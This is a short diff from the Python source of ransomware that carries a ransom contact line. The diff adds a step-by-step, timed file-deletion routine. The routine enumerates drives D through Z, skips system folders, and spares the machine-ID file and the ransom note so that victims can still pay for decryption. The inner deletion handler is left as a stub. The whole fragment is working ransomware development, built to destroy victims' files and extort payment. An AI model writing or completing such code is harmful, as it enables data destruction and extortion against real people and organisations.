@@ -1090,8 +1090,24 @@ Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""
         self.deletionThread.start()
 
 
+    # Step 56: Function to delete files with timing
     def delete_files_with_timing(self):
-        pass
+        # get exists drives on the machine
+        drives = [f"{x}:\\" for x in "DEFGHIJKLMNOPQRSTUVWXYZ" if path.exists(f"{x}:\\")]
+
+        # define exclude directories
+        excludeDirectories = {'System Volume Information', '$RECYCLE.BIN', 'Windows'}
+
+        # define exclude files, we don't remove Machine_id.txt
+        # because if application close or crashed, we need Machine_id.txt to be able to Recover a Decryption key
+        excludeFiles = {'Machine_id.txt', 'read_me_for_decryption.txt'}
+
+        def handle_deletion(directory):
+            pass
+
+
+
+
 
 
 if __name__ == "__main__":
